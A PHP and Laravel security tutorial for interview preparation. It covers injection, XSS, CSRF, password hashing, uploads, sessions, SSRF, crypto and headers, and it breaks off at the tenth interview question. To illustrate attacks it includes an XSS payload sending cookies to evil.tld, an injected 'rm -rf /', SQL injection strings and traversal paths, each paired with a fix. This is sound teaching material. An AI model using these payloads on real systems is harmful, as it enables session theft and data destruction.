# Security Best Practices in PHP & Laravel

Security is not a feature you bolt on at the end — it is a property of every line of code that touches data you did not write yourself. This module is a practical, OWASP-flavored tour of the attacks a backend/full-stack engineer is expected to understand, and the concrete PHP 8.4 and Laravel 12 tools that defend against them. The mantra throughout: **never trust input, always encode output, and let the framework do the dangerous work for you.**

> **OWASP** (Open Worldwide Application Security Project) publishes the "OWASP Top 10," a periodically updated list of the most critical web application security risks. Most of the topics below map directly to it: injection, broken access control, cryptographic failures, security misconfiguration, and so on.

## **What you'll learn**

- How SQL injection, XSS, CSRF, SSRF, command injection, and directory traversal actually work — and the *one* defensive idea behind all of them
- Why prepared statements beat escaping, and how Laravel's query builder/Eloquent give you them for free
- Correct password storage with `password_hash`, `password_verify`, and `password_needs_rehash` — and why `md5`/`sha1` are disqualifying answers in an interview
- Context-aware output encoding with `htmlspecialchars`, Blade's `{{ }}`, and a Content-Security-Policy
- Hardening sessions and cookies: `httponly`, `secure`, `samesite`, and session-fixation defense via `session_regenerate_id()`
- Encryption vs. hashing, and modern primitives via `libsodium` and `openssl`
- Timing attacks and why `hash_equals()` exists
- Secrets management, production error handling, file-upload safety, mass assignment, and HTTP security headers

---

## 1. The one idea behind every injection attack

Almost every classic web vulnerability is the same mistake wearing different clothes: **attacker-controlled data is interpreted as code or commands by some downstream system.** The downstream system might be a SQL database (SQL injection), an HTML/JS renderer (XSS), a shell (command injection), the filesystem (directory traversal), or your own HTTP client (SSRF).

The defense is always one of two things:

1. **Separation of code and data** — send the instruction and the data through different channels so the data can never be re-interpreted as instruction (prepared statements, `escapeshellarg`).
2. **Context-aware encoding** — if you *must* embed data into a string that will be interpreted, encode it for that exact context (HTML-encode for HTML, URL-encode for URLs, etc.).

Keep this framing in mind; it turns a list of disconnected tricks into a single coherent principle.

---

## 2. SQL Injection (SQLi)

### Why it happens

SQL injection occurs when user input is concatenated directly into a SQL string. The database parser cannot tell where your intended query ends and the attacker's payload begins.

```php
<?php
// 🚨 NEVER DO THIS — vulnerable to SQL injection
$email = $_GET['email'];                 // e.g. "x' OR '1'='1"
$pdo->query("SELECT * FROM users WHERE email = '$email'");
// Effective query: SELECT * FROM users WHERE email = 'x' OR '1'='1'
// → returns every row; with UNION/stacked queries an attacker can dump or drop tables.
```

### The fix: prepared statements (parameterized queries)

A **prepared statement** sends the SQL *template* to the database first (where placeholders mark the data slots), then sends the values separately. The values are never parsed as SQL, so injection is structurally impossible.

```php
<?php
$pdo = new PDO(
    'mysql:host=localhost;dbname=app;charset=utf8mb4',
    'user',
    'secret',
    [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION, // throw on error
        PDO::ATTR_EMULATE_PREPARES   => false,                 // use REAL native prepares
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]
);

// Named placeholders
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email AND active = :active');
$stmt->execute([':email' => $_GET['email'], ':active' => 1]);
$user = $stmt->fetch();

// Positional placeholders work too
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = ? AND active = ?');
$stmt->execute([$_GET['email'], 1]);
```

> **Critical gotcha:** `PDO::ATTR_EMULATE_PREPARES` defaults to **`true`** for MySQL. Emulated prepares do client-side string interpolation, which is *usually* safe but reintroduces edge cases and breaks real type handling. Always set it to `false` for true server-side prepared statements.

You **cannot** parameterize identifiers (table/column names, `ORDER BY` direction). For those, use an **allowlist**:

```php
<?php
$allowedSort = ['name', 'created_at', 'email'];
$sort = in_array($_GET['sort'] ?? '', $allowedSort, true) ? $_GET['sort'] : 'name';
$dir  = ($_GET['dir'] ?? '') === 'desc' ? 'DESC' : 'ASC';
$stmt = $pdo->query("SELECT * FROM users ORDER BY $sort $dir"); // safe: values come from an allowlist
```

### In Laravel 12

The query builder and Eloquent bind every value as a parameter automatically:

```php
<?php
use App\Models\User;
use Illuminate\Support\Facades\DB;

// Eloquent — parameterized
$users = User::where('email', $request->input('email'))->get();

// Query builder — parameterized
DB::table('users')->where('active', 1)->whereLike('name', '%'.$term.'%')->get();
// whereLike() was added in Laravel 11.x and is case-handling aware across drivers in 12.

// Raw expressions still need bindings — pass an array, never concatenate
DB::select('SELECT * FROM users WHERE email = ?', [$request->input('email')]);
DB::table('users')->whereRaw('age > ?', [$request->integer('min')])->get();
```

The only way to be vulnerable in Laravel is to hand-build raw SQL with string interpolation (e.g. `whereRaw("age > $age")`). Don't.

---

## 3. Cross-Site Scripting (XSS)

### Why it happens

**XSS** is injection into the *browser*. If attacker-controlled text reaches the page without encoding, the browser may execute it as HTML/JavaScript — stealing cookies, rewriting the DOM, or making requests as the victim.

```php
<?php
// 🚨 Reflected XSS
echo "Hello, " . $_GET['name'];
// ?name=<script>fetch('https://evil.tld?c='+document.cookie)</script>
```

### The fix: context-aware output encoding

Encode data for the context it lands in. For HTML body/attribute context, `htmlspecialchars` converts `< > & " '` into HTML entities so the browser renders them as text.

```php
<?php
// Always pass the flags and encoding explicitly.
$safe = htmlspecialchars($_GET['name'], ENT_QUOTES | ENT_HTML5, 'UTF-8');
echo "Hello, $safe";
// Output for ?name=<b>hi</b>:  Hello, &lt;b&gt;hi&lt;/b&gt;
```

- `ENT_QUOTES` encodes **both** single and double quotes (default only encodes double). Single quotes matter inside single-quoted attributes.
- Since PHP **8.1**, the default flags became `ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401`, so single quotes are now encoded by default — but be explicit anyway for portability across versions.
- Use `htmlspecialchars` (encodes the 5 special chars) over `htmlentities` (encodes everything to entities) — `htmlspecialchars` is faster and sufficient when your page is UTF-8.

**Encoding is context-specific.** HTML-encoding is *wrong* inside a `<script>` block, a URL, or a CSS value:

```blade
{{-- HTML body / attribute: Blade escapes automatically --}}
<p>Hello, {{ $name }}</p>
<input value="{{ $name }}">

{{-- URL context: encode for URLs, not HTML --}}
<a href="/search?q={{ urlencode($q) }}">search</a>

{{-- JS context: never drop raw PHP into a script tag. Use json_encode (which escapes for JS). --}}
<script>
    const user = @json($user); {{-- Blade's @json == json_encode with safe flags --}}
</script>
```

### Blade and the `{!! !!}` trap

In Laravel, `{{ $var }}` runs `htmlspecialchars` for you. The unescaped `{!! $var !!}` does **not** — only use it for HTML you generated and trust (e.g. sanitized rich text). If you must render user-supplied HTML, sanitize it first with a library like `mews/purifier` (HTML Purifier).

```blade
{{ $comment }}        {{-- escaped — safe default --}}
{!! $trustedHtml !!}  {{-- raw — DANGEROUS with user input --}}
```

### Defense in depth: Content-Security-Policy (CSP)

A **CSP** is an HTTP response header that tells the browser which sources of script/style/etc. are allowed to execute. Even if an XSS payload sneaks in, a strict CSP can stop it from running inline or loading from an attacker domain.

```php
<?php
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'");
```

CSP is a *second line of defense*, not a replacement for output encoding. The strongest CSPs use per-request **nonces** (`script-src 'nonce-<random>'`) so only your own inline scripts run.

---

## 4. Cross-Site Request Forgery (CSRF)

### Why it happens

**CSRF** tricks a logged-in user's browser into making a state-changing request the user did not intend. Because browsers automatically attach cookies, a hidden form on `evil.tld` can POST to `yourbank.com/transfer` using the victim's session.

### The fix: synchronizer token + SameSite cookies

A **CSRF token** is an unpredictable, per-session value that you embed in every form and verify on submission. The attacker's site cannot read your token (same-origin policy), so it cannot forge a valid request.

```php
<?php
// Vanilla PHP token pattern
session_start();
if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = bin2hex(random_bytes(32)); // CSPRNG — never rand()/mt_rand()
}
```

```php
<?php
// In the form
echo '<input type="hidden" name="csrf" value="'
   . htmlspecialchars($_SESSION['csrf'], ENT_QUOTES, 'UTF-8') . '">';
```

```php
<?php
// On submit — compare in constant time (see §13 on timing attacks)
if (!isset($_POST['csrf']) || !hash_equals($_SESSION['csrf'], $_POST['csrf'])) {
    http_response_code(419);
    exit('CSRF token mismatch');
}
```

**`SameSite` cookies** are a complementary browser-level defense. A cookie with `SameSite=Lax` (the modern browser default) is not sent on cross-site POST requests, blocking most CSRF automatically. `Strict` is even tighter but breaks "click a link from email and stay logged in" flows.

### In Laravel 12

Laravel handles CSRF automatically for web routes via the `ValidateCsrfToken` middleware (renamed from `VerifyCsrfToken` in Laravel 11+).

```blade
<form method="POST" action="/profile">
    @csrf            {{-- emits <input type="hidden" name="_token" value="..."> --}}
    @method('PUT')   {{-- spoof PUT/PATCH/DELETE via a _method field --}}
    ...
</form>
```

For JavaScript/AJAX, send the token in the `X-CSRF-TOKEN` header (or use the `XSRF-TOKEN` cookie that Laravel sets, which Axios reads automatically). A 419 "Page Expired" response means a missing/expired token. Note: **stateless API routes guarded by tokens (Sanctum/Passport) don't use CSRF** — CSRF only matters for cookie-based session auth.

---

## 5. Password storage

### Why `md5`/`sha1` are wrong answers

`md5` and `sha1` are *fast* general-purpose hashes — that is exactly what makes them terrible for passwords. An attacker with a leaked database can compute *billions* of guesses per second on a GPU, and precomputed "rainbow tables" reverse common hashes instantly. They are also unsalted by default. **Stating you'd use `md5`/`sha1` for passwords is an automatic fail in an interview.**

### The right way: `password_hash` + `password_verify`

PHP's password API uses a deliberately *slow*, *salted*, *adaptive* algorithm. The salt is generated automatically and stored inside the output string.

```php
<?php
// Hashing (bcrypt is the default; PASSWORD_DEFAULT may change across PHP versions)
$hash = password_hash($plain, PASSWORD_DEFAULT);
// $2y$12$Nq...  (bcrypt: algo $2y$, cost 12, then salt+hash — 60 chars total)

// Argon2id (recommended where available; memory-hard, GPU-resistant)
$hash = password_hash($plain, PASSWORD_ARGON2ID, [
    'memory_cost' => 65536, // KiB
    'time_cost'   => 4,     // iterations
    'threads'     => 1,
]);

// Verifying — NEVER compare hashes with == ; let the API do it
if (password_verify($plain, $hash)) {
    // authenticated
}
```

> Store the hash in a column at least **255 chars** wide. Although bcrypt is 60 chars, Argon2id and future algorithms are longer; `VARCHAR(255)` is the standard safe size.

### Rehashing as costs increase

Hardware gets faster, so you raise the cost over time. `password_needs_rehash` tells you when a stored hash uses outdated parameters; rehash transparently on the next successful login (the only moment you have the plaintext).

```php
<?php
if (password_verify($plain, $user->password)) {
    if (password_needs_rehash($user->password, PASSWORD_DEFAULT)) {
        $user->password = password_hash($plain, PASSWORD_DEFAULT);
        $user->save();
    }
    // proceed
}
```

### PHP 8.4 note

PHP 8.4 changed bcrypt's **default cost from 10 to 12**, making hashing slower and more resistant to brute force. Existing cost-10 hashes still verify fine; `password_needs_rehash($hash, PASSWORD_BCRYPT)` will now report `true` for them, prompting an upgrade on next login.

### In Laravel 12

```php
<?php
use Illuminate\Support\Facades\Hash;

$user->password = Hash::make($plain);          // uses config/hashing.php (bcrypt default)
Hash::check($plain, $user->password);          // → bool
Hash::needsRehash($user->password);            // → bool

// Switch to Argon2id in config/hashing.php: 'driver' => 'argon2id'
```

When you cast the `password` attribute with `protected $casts = ['password' => 'hashed'];` (the default on Laravel's `User` model since L10), assigning a plaintext password auto-hashes it on save.

---

## 6. Input validation & sanitization with allowlists

**Validation** rejects bad input; **sanitization** transforms it. Prefer validation with an **allowlist** ("accept only what matches this exact shape") over a **denylist** ("block these known-bad patterns") — denylists are always incomplete.

```php
<?php
// Validate
$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
if ($email === false) {
    exit('Invalid email');
}

$age = filter_var($_POST['age'], FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 0, 'max_range' => 130],
]);
if ($age === false) { exit('Invalid age'); }

$url = filter_var($_POST['url'], FILTER_VALIDATE_URL); // returns the URL or false
```

> **Trap:** `FILTER_VALIDATE_BOOLEAN` returns `null` (not `false`) for non-boolean input when you pass `FILTER_NULL_ON_FAILURE`. Always check types explicitly. And remember `0`/`""` are valid integers/strings — use `=== false` to detect failure, not a falsy check.

Allowlist enums for fixed sets — PHP 8.1 backed enums are perfect:

```php
<?php
enum Role: string {
    case Admin  = 'admin';
    case Editor = 'editor';
    case Viewer = 'viewer';
}
$role = Role::tryFrom($_POST['role'] ?? '') ?? Role::Viewer; // unknown → safe default
```

In Laravel, the validator *is* your allowlist:

```php
<?php
$validated = $request->validate([
    'email' => ['required', 'email:rfc,dns'],
    'age'   => ['required', 'integer', 'between:0,130'],
    'role'  => ['required', Rule::enum(Role::class)],
    'url'   => ['nullable', 'url'],
]);
// $validated contains ONLY the listed keys — itself a defense against mass assignment.
```

---

## 7. Mass assignment

**Mass assignment** is bulk-setting model attributes from a request array. The danger: an attacker adds an unexpected field (e.g. `is_admin=1`) that you never intended to be user-settable.

```php
<?php
// 🚨 If $request->all() contains is_admin, it gets written.
User::create($request->all());
```

Laravel defends with `$fillable` (allowlist) or `$guarded` (denylist):

```php
<?php
class User extends Model {
    protected $fillable = ['name', 'email', 'password']; // ONLY these are mass-assignable
    // is_admin is not listed → silently ignored on create()/fill()/update()
}
```

Best practice: feed models **validated** data (`$request->validated()`), not `$request->all()`. In raw PHP, the same principle applies — explicitly pick the columns you write, never splat the whole `$_POST`.

---

## 8. File upload security

Untrusted files are a top vector for remote code execution. A "profile picture" that is actually `shell.php` can give an attacker full control if it lands in a web-accessible, executable directory.

Defenses, layered:

```php
<?php
$f = $_FILES['avatar'];

// 1. Check the upload actually came via HTTP POST (not a forged path).
if (!is_uploaded_file($f['tmp_name'])) { exit('Invalid upload'); }

// 2. Validate the REAL MIME type from content, not the client-supplied $f['type'].
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime  = $finfo->file($f['tmp_name']);
$allowed = ['image/jpeg' => 'jpg', 'image/png' => 'png', 'image/webp' => 'webp'];
if (!isset($allowed[$mime])) { exit('Type not allowed'); }

// 3. Enforce a size limit.
if ($f['size'] > 2 * 1024 * 1024) { exit('Too large'); }

// 4. Generate your OWN filename — never trust the client name (directory traversal!).
$name = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];

// 5. Store OUTSIDE the web root (or in a bucket), serve via a controller.
move_uploaded_file($f['tmp_name'], "/var/app/uploads/$name");
```

Key rules: **(a)** decide the extension from the detected MIME, not the uploaded name; **(b)** store uploads outside the public/executable directory and disable PHP execution there (`php_admin_flag engine off` in Apache, or no PHP handler in nginx); **(c)** re-encode images to strip embedded payloads when feasible.

Laravel makes most of this declarative:

```php
<?php
$request->validate(['avatar' => ['required', 'image', 'mimes:jpg,png,webp', 'max:2048']]);
$path = $request->file('avatar')->store('avatars', 'public'); // hashed name on the 'public' disk
// 'mimes' checks the guessed type; 'image' ensures it's a real image. max is in kilobytes.
```

---

## 9. Session security

Sessions identify a logged-in user via a session ID stored in a cookie. Three things must be true: the ID must be unguessable, the cookie must be locked down, and the ID must rotate at privilege boundaries.

### Cookie hardening

```php
<?php
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'secure'   => true,      // only sent over HTTPS — prevents network sniffing
    'httponly' => true,      // not readable by JS — blunts cookie theft via XSS
    'samesite' => 'Lax',     // not sent on cross-site POST — CSRF defense
]);
session_start();
```

```ini
; php.ini equivalents — set these globally
session.cookie_secure   = 1
session.cookie_httponly = 1
session.cookie_samesite = "Lax"
session.use_strict_mode = 1   ; reject server-unknown session IDs (anti-fixation)
```

### Session fixation

**Session fixation:** an attacker plants a known session ID in the victim's browser *before* login; if the ID survives the login, the attacker now shares the authenticated session. **Fix: regenerate the ID at the moment privilege changes** (login, logout, role elevation).

```php
<?php
// On successful login
session_regenerate_id(true); // true = delete the OLD session file
$_SESSION['user_id'] = $user->id;
```

### In Laravel 12

Configure in `config/session.php` (`secure`, `http_only`, `same_site`, `encrypt`). Laravel **automatically regenerates the session ID on login and invalidates it on logout**:

```php
<?php
// What Auth does under the hood / what you'd do manually:
$request->session()->regenerate();          // on login
$request->session()->invalidate();          // on logout
$request->session()->regenerateToken();     // rotate CSRF token too
```

---

## 10. Directory (path) traversal

**Directory traversal** uses `../` sequences (or absolute paths) to escape an intended directory and read/write arbitrary files like `/etc/passwd` or your `.env`.

```php
<?php
// 🚨 ?file=../../../../etc/passwd
$path = "/var/app/files/" . $_GET['file'];
readfile($path);
```

The robust fix: resolve to a canonical absolute path with `realpath()` and verify it is still *inside* the allowed base directory. Combine with an allowlist where possible.

```php
<?php
$base = realpath('/var/app/files');                 // canonical base
$target = realpath($base . '/' . $_GET['file']);     // canonical requested path

// realpath() returns false if the file doesn't exist; str_starts_with confirms containment.
if ($target === false || !str_starts_with($target, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(404);
    exit('Not found');
}
readfile($target);
```

Also strip directory components defensively with `basename()` when you only expect a flat filename. In Laravel, prefer the Storage facade (`Storage::disk('local')->get($path)`) which is scoped to a configured root and rejects traversal.

---

## 11. Command injection

If you pass user input into a shell (`exec`, `shell_exec`, `system`, `passthru`, `proc_open`, backticks), shell metacharacters (`;`, `|`, `&&`, `$()`, backticks) let an attacker run arbitrary commands.

```php
<?php
// 🚨 ?host=8.8.8.8; rm -rf /
system("ping -c 1 " . $_GET['host']);
```

First choice: **don't shell out** — use a native PHP function or library. If you must, escape **arguments** with `escapeshellarg()` (wraps and escapes a single argument) and, only when unavoidable, `escapeshellcmd()` for the command itself.

```php
<?php
$host = $_GET['host'];
$cmd  = 'ping -c 1 ' . escapeshellarg($host); // quotes & neutralizes metacharacters
$output = shell_exec($cmd);
// escapeshellarg('8.8.8.8; rm -rf /') => '8.8.8.8; rm -rf /' as ONE literal argument
```

Best of all, bypass the shell entirely with `proc_open` and an **argument array** (PHP passes args directly to the program, no shell parsing):

```php
<?php
$proc = proc_open(['ping', '-c', '1', $host], [1 => ['pipe', 'w']], $pipes);
// 'ping' receives $host as a single argv element — shell metacharacters are inert.
```

---

## 12. Server-Side Request Forgery (SSRF)

**SSRF:** you make an HTTP request to a URL the user supplied, and the attacker points it at internal infrastructure — `http://169.254.169.254/` (cloud metadata, can leak credentials), `http://localhost:6379` (Redis), or internal admin panels behind your firewall.

```php
<?php
// 🚨 Fetches whatever the user names.
$contents = file_get_contents($_GET['url']);
```

Defenses:

```php
<?php
$url   = $_GET['url'];
$parts = parse_url($url);

// 1. Allowlist scheme and host.
if (!in_array($parts['scheme'] ?? '', ['https'], true)) { exit('blocked'); }
$allowedHosts = ['api.partner.com', 'cdn.partner.com'];
if (!in_array($parts['host'] ?? '', $allowedHosts, true)) { exit('blocked'); }

// 2. Resolve the host and reject private/loopback/link-local IPs.
//    NOTE: gethostbyname() returns the *hostname unchanged* if resolution fails and
//    only handles IPv4. For robust SSRF defense also resolve AAAA records (e.g. via
//    dns_get_record($host, DNS_A | DNS_AAAA)) and reject IPv6 private/ULA ranges too.
$ip = gethostbyname($parts['host']);
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    exit('blocked: private IP');
}
```

> **TOCTOU / DNS rebinding caveat:** Checking the IP and *then* letting the HTTP client re-resolve the hostname is a time-of-check/time-of-use gap — the attacker can return a public IP on the first lookup and a private IP on the second. The robust fix is to resolve the host *once*, validate every returned A/AAAA record, and force the request to connect to that vetted IP (e.g. cURL's `CURLOPT_RESOLVE`, or pinning the IP and sending the original hostname via the `Host` header).

Additional hardening: disable redirect-following (an allowed host can 302 you to `169.254.169.254`), set short timeouts, cap response size, and never reflect the raw response back to the user. In Laravel use the HTTP client with `Http::withoutRedirecting()->timeout(5)->get($url)` plus the same allowlist checks.

---

## 13. Encryption vs. hashing, and timing attacks

### Hashing vs. encryption — different jobs

| Property | Hashing | Encryption |
|---|---|---|
| Direction | One-way (irreversible) | Two-way (reversible with key) |
| Use case | Passwords, integrity checks | Storing recoverable secrets (tokens, PII) |
| Key needed? | No (passwords use a salt) | Yes |
| Examples | bcrypt, Argon2id, SHA-256 | AES-256-GCM, libsodium secretbox |

Rule of thumb: **if you ever need the original value back, encrypt. If you only need to check a match, hash.** Passwords are hashed; a stored API credential you must replay is encrypted.

### Encryption with libsodium (preferred) and openssl

PHP's bundled **libsodium** (`sodium_*`) provides modern, hard-to-misuse, authenticated encryption.

```php
<?php
$key = sodium_crypto_secretbox_keygen();               // 32-byte key (store in a secret manager)
$nonce = random_bytes(SODIUM_CRYPTO_SECRETBOX_NONCEBYTES); // unique per message

$cipher = sodium_crypto_secretbox('top secret', $nonce, $key);
$plain  = sodium_crypto_secretbox_open($cipher, $nonce, $key); // false if tampered/wrong key
```

`openssl` works too — but you **must** use an authenticated mode like AES-256-GCM (which produces an auth tag that detects tampering). Never use ECB mode; never use unauthenticated CBC without a separate MAC.

```php
<?php
$key   = random_bytes(32);
$iv    = random_bytes(12); // 96-bit IV for GCM
$tag   = '';
$ct    = openssl_encrypt('secret', 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);
$plain = openssl_decrypt($ct, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag); // false if tag invalid
// To decrypt later you must persist/transmit $iv and $tag alongside $ct (they are not
// secret, but they are required). A common bug is storing only $ct and losing the tag.
// Never reuse the same ($key, $iv) pair for two messages — it breaks GCM catastrophically.
```

In Laravel 12, `Crypt::encryptString()` / `decryptString()` use OpenSSL with the **AES-256-CBC** cipher (the default; `AES-128-CBC` is also supported), and every ciphertext is **signed with a MAC** so tampered values fail to decrypt (they throw `Illuminate\Contracts\Encryption\DecryptException`). The key comes from `APP_KEY`. Configure the cipher via the `cipher` option in `config/app.php`. Never hand-roll crypto in app code when the framework provides it.

> **Common misconception:** Laravel's encrypter does *not* use AES-256-GCM. It uses authenticated encryption via **CBC + a separate MAC** (encrypt-then-MAC), which provides the same tamper-detection guarantee as GCM. If you specifically need GCM, use `openssl_encrypt()`/`sodium_*` directly as shown above.

### Timing attacks and `hash_equals`

A naive string comparison (`==` / `===`) **short-circuits** at the first differing byte. By measuring response time, an attacker can recover a secret one byte at a time. **Constant-time comparison** always examines the full length regardless of where the mismatch is.

```php
<?php
// 🚨 Leaks timing information
if ($userToken === $secretToken) { /* ... */ }

// ✅ Constant-time
if (hash_equals($secretToken, $userToken)) { /* ... */ }
```

Use `hash_equals()` for CSRF tokens, API keys, HMAC signatures, password-reset tokens — any secret you compare for equality. (`password_verify()` is already constant-time internally, so you don't wrap it.)

---

## 14. Secrets management & production configuration

### Secrets in environment variables, never in code

Hardcoded credentials end up in Git history forever. Keep them in environment variables / a secret manager, and keep `.env` out of version control.

```env
# .env  — NEVER commit this file
APP_KEY=base64:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
DB_PASSWORD=super-secret
STRIPE_SECRET=sk_live_...
```

```bash
echo ".env" >> .gitignore        # commit .env.example with placeholder values instead
```

In Laravel, read via `config()` (cached), and prefer `config('services.stripe.secret')` over calling `env()` outside config files — `php artisan config:cache` makes raw `env()` calls return `null` in production.

### Turn off error display in production

Detailed errors leak file paths, queries, and stack traces — a reconnaissance gift to attackers.

```ini
; php.ini — PRODUCTION
display_errors = Off       ; never show errors to users
log_errors     = On        ; log them where only you can read
error_reporting = E_ALL    ; still capture everything in the log
```

```env
# Laravel — production
APP_ENV=production
APP_DEBUG=false   # true here exposes Ignition's full stack traces and env vars
```

`APP_DEBUG=true` in production is one of the most common and most severe real-world misconfigurations — it can expose the entire environment, including `APP_KEY` and database credentials.

---

## 15. HTTP security headers

Headers instruct the browser to enforce protections it can't infer on its own.

```php
<?php
header('X-Content-Type-Options: nosniff');           // don't MIME-sniff; respect Content-Type
header('X-Frame-Options: DENY');                      // block framing → clickjacking defense
header('Referrer-Policy: strict-origin-when-cross-origin');
header('Strict-Transport-Security: max-age=63072000; includeSubDomains; preload'); // HSTS
header("Content-Security-Policy: default-src 'self'");
```

- **HSTS (Strict-Transport-Security):** after the first visit, the browser refuses to talk to your site over plain HTTP for `max-age` seconds — defeats SSL-strip downgrade attacks. Only send it over HTTPS, and be sure HTTPS works before enabling `preload` (it's hard to undo).
- **X-Frame-Options / `frame-ancestors` CSP directive:** prevents your pages from being embedded in a malicious `<iframe>` (clickjacking). The CSP `frame-ancestors` directive is the modern superset.
- **X-Content-Type-Options: nosniff:** stops the browser from guessing a content type and, say, executing a `.txt` upload as script.

In Laravel, set these once in a middleware applied to all responses:

```php
<?php
public function handle($request, Closure $next) {
    $response = $next($request);
    $response->headers->set('X-Frame-Options', 'DENY');
    $response->headers->set('X-Content-Type-Options', 'nosniff');
    $response->headers->set('Strict-Transport-Security', 'max-age=63072000; includeSubDomains');
    return $response;
}
```

---

## ⚠️ Common Mistakes & Gotchas

1. **Thinking escaping equals safety in SQL.** Manually escaping with `addslashes()` or even concatenating after `mysqli_real_escape_string()` is fragile (charset edge cases, `LIKE` wildcards). **Fix:** always use prepared statements with bound parameters; never build SQL with user data via string interpolation.

2. **HTML-encoding in the wrong context.** Running `htmlspecialchars()` on a value you then drop inside a `<script>` block or a `href` does *not* protect you — JS and URL contexts have different escaping rules. **Fix:** encode for the destination context — `json_encode`/`@json` for JS, `urlencode`/`rawurlencode` for URLs, `htmlspecialchars(ENT_QUOTES)` for HTML.

3. **Trusting the client-supplied file MIME type / filename.** `$_FILES['x']['type']` and the original filename are attacker-controlled; a `.php` file can claim `image/png`. **Fix:** detect the real type with `finfo`, generate your own filename with `random_bytes`, store outside the web root, and disable script execution there.

4. **Comparing secrets with `==` / `===`.** This leaks timing and (with `==`) suffers type-juggling pitfalls. **Fix:** use `hash_equals()` for CSRF tokens, API keys, and HMACs; use `password_verify()` for passwords.

5. **`APP_DEBUG=true` (or `display_errors=On`) in production.** Leaks stack traces, queries, file paths, and environment variables. **Fix:** `APP_DEBUG=false`, `display_errors=Off`, `log_errors=On`; show users a generic error page.

6. **Forgetting `session_regenerate_id()` at login.** Leaves you open to session fixation. **Fix:** regenerate on every privilege change. Laravel's Auth does this for you — don't bypass it with manual session writes.

7. **Using `{!! !!}` on user input in Blade**, or `md5/sha1` for passwords, or `rand()`/`uniqid()` for tokens. **Fix:** `{{ }}` by default; `password_hash`/`Hash::make`; `random_bytes`/`bin2hex(random_bytes(32))` (CSPRNG) for tokens.

---

## ✅ Best Practices

- **Never trust input; never emit unencoded output.** Validate with allowlists at the boundary; encode at the point of output for the exact context.
- **Let the framework do dangerous work.** Eloquent for SQL, Blade for HTML, `Hash`/`Crypt` for crypto, Auth for sessions, the validator for input. Hand-rolling these is where bugs live.
- **Defense in depth.** CSP behind output encoding; allowlists behind prepared statements; SameSite cookies behind CSRF tokens. One layer failing should not be game over.
- **Use a CSPRNG** (`random_bytes`, `random_int`) for anything security-relevant; never `rand`, `mt_rand`, or `uniqid`.
- **Hash passwords with bcrypt/Argon2id**, rehash on login when costs rise, store in `VARCHAR(255)`.
- **Encrypt only what must be recovered**, always with an authenticated mode (AES-GCM or libsodium); keep keys in a secret manager, never in code.
- **Keep secrets in env/secret managers**, `.env` out of Git, `APP_DEBUG=false` and `display_errors=Off` in production.
- **Set security headers globally** (HSTS, CSP, X-Frame-Options, nosniff) and serve everything over HTTPS.
- **Patch and update** PHP, Laravel, and Composer dependencies; run `composer audit` to catch known CVEs.
- **Apply least privilege** to DB users, filesystem permissions, and cloud roles.

---

## 🎯 Interview Tips & Likely Questions

**Q1. How do prepared statements actually prevent SQL injection under the hood?**
A: The SQL template (with `?`/`:name` placeholders) is sent to and parsed/planned by the database *first*, fixing the query structure. The parameter values are transmitted separately over the protocol and treated strictly as data bound to those placeholders — they are never re-parsed as SQL. So even `' OR '1'='1` is just a literal string compared against a column, not new syntax. (Caveat: PDO's *emulated* prepares interpolate client-side, so set `ATTR_EMULATE_PREPARES => false` for true server-side prepares.)

**Q2. Why is `md5`/`sha1` wrong for passwords, and what's right?**
A: They're fast and unsalted, so GPUs and rainbow tables crack leaked hashes trivially. Use `password_hash()` with bcrypt or Argon2id — slow, salted, and adaptive. Verify with `password_verify()` and upgrade old hashes with `password_needs_rehash()` on login.

**Q3. Difference between encryption and hashing? When do you use each?**
A: Hashing is one-way (irreversible) and is for passwords and integrity checks; you only ever compare. Encryption is two-way (reversible with a key) and is for secrets you must recover later, like a stored OAuth token. If you need the original value back, encrypt; otherwise hash.

**Q4. What is a timing attack and how do you defend against it?**
A: Standard comparisons short-circuit at the first mismatched byte, so response time correlates with how much of a secret the attacker guessed correctly — letting them recover it byte by byte. `hash_equals()` compares in constant time regardless of where bytes differ, closing the leak.

**Q5. Explain CSRF and two layers of defense.**
A: CSRF makes a victim's authenticated browser send a state-changing request they didn't intend, abusing automatic cookie attachment. Defenses: (1) a per-session synchronizer token embedded in forms and verified server-side (the attacker's origin can't read it); (2) `SameSite=Lax/Strict` cookies that browsers won't send on cross-site requests. Laravel's `@csrf` + `ValidateCsrfToken` middleware does (1) automatically.

**Q6. What's the difference between XSS and CSRF?**
A: XSS injects and runs attacker *script in the victim's browser* (a code-execution-in-browser problem) — fixed by output encoding and CSP. CSRF makes the browser send a *forged request* without running attacker code — fixed by CSRF tokens and SameSite cookies. They're often confused; XSS can actually be used to defeat CSRF tokens, which is why you fix both.

**Q7. How would you secure a file upload?**
A: Validate real MIME via `finfo` (not client `type`), enforce a size cap, generate your own random filename (never the client's), choose the extension from the detected type, store outside the web root or in object storage, and disable PHP execution in the upload directory. In Laravel: `image|mimes:...|max:` validation plus `->store()` which hashes names.

**Q8. What is mass assignment and how does Laravel protect against it?**
A: Bulk-assigning request data to model attributes can let an attacker set fields like `is_admin`. Laravel uses `$fillable` (allowlist) or `$guarded` (denylist) to control which attributes are mass-assignable, and best practice is to pass `$request->validated()` rather than `$request->all()`.

**Q9. What's SSRF and why is the cloud metadata endpoint relevant?**
A: SSRF tricks your server into requesting an attacker-chosen URL, often internal — e.g. `http://169.254.169.254/`, the cloud metadata service, which on misconfigured instances can return IAM credentials. Defenses: allowlist scheme/host, resolve and reject private/loopback/link-local IPs, disable redirect-following, and never reflect the response back.

**Q10. Name the key HTTP security headers and what each does.**
